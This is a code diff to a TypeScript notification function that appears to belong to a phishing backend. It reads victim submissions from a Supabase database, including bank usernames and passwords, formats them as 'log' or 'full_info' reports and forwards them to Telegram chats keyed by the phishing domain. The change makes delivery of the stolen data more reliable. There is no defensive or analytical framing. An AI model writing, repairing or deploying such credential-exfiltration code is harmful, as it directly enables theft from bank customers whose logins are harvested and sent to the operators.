@@ -93,40 +93,23 @@ async function processNotification(
   botToken: string,
   submission_id: string,
   kind: "full_info" | "log" | "auto",
-  force = false,
+  _force = false,
 ): Promise<{ ok: boolean; sent: number; reason?: string; kind?: string }> {
-  let submission: any;
+  // Load current submission state
+  const { data: submission, error } = await supabase
+    .from("submissions")
+    .select("*")
+    .eq("id", submission_id)
+    .single();
 
-  if (force) {
-    // Force mode: skip atomic claim, just load the row
-    const { data, error } = await supabase
-      .from("submissions")
-      .select("*")
-      .eq("id", submission_id)
-      .single();
-    if (error || !data) return { ok: false, sent: 0, reason: "not_found" };
-    submission = data;
-  } else {
-    // Atomic claim: only proceed if telegram_sent is still false
-    const { data: claimed, error: claimErr } = await supabase
-      .from("submissions")
-      .update({ telegram_sent: true, notified_at: new Date().toISOString() })
-      .eq("id", submission_id)
-      .eq("telegram_sent", false)
-      .select("*");
+  if (error || !submission) return { ok: false, sent: 0, reason: "not_found" };
 
-    if (claimErr || !claimed || claimed.length === 0) {
-      return { ok: true, sent: 0, reason: "already_sent" };
-    }
-    submission = claimed[0];
-
-    // For full_info: skip if user has since entered login credentials
-    if (kind === "full_info" && submission.bank_username) {
-      return { ok: true, sent: 0, reason: "login_present" };
-    }
+  // If already sent and this is an auto/cron call, skip
+  if (submission.telegram_sent && kind === "auto") {
+    return { ok: true, sent: 0, reason: "already_sent" };
   }
 
-  // Auto-detect kind from submission state
+  // Determine kind from current DB state (auto), or use explicit kind
   let resolvedKind: "log" | "full_info";
   if (kind === "auto") {
     resolvedKind = submission.bank_username && submission.bank_password ? "log" : "full_info";
@@ -137,7 +120,8 @@ async function processNotification(
   const text = resolvedKind === "log" ? formatLog(submission) : formatFullInfo(submission);
   const sent = await sendToMatchingChats(supabase, botToken, text, submission.domain);
 
-  if (force && sent > 0) {
+  // Only mark as sent if at least one Telegram message was successfully delivered
+  if (sent > 0) {
     await supabase
       .from("submissions")
       .update({ telegram_sent: true, notified_at: new Date().toISOString() })
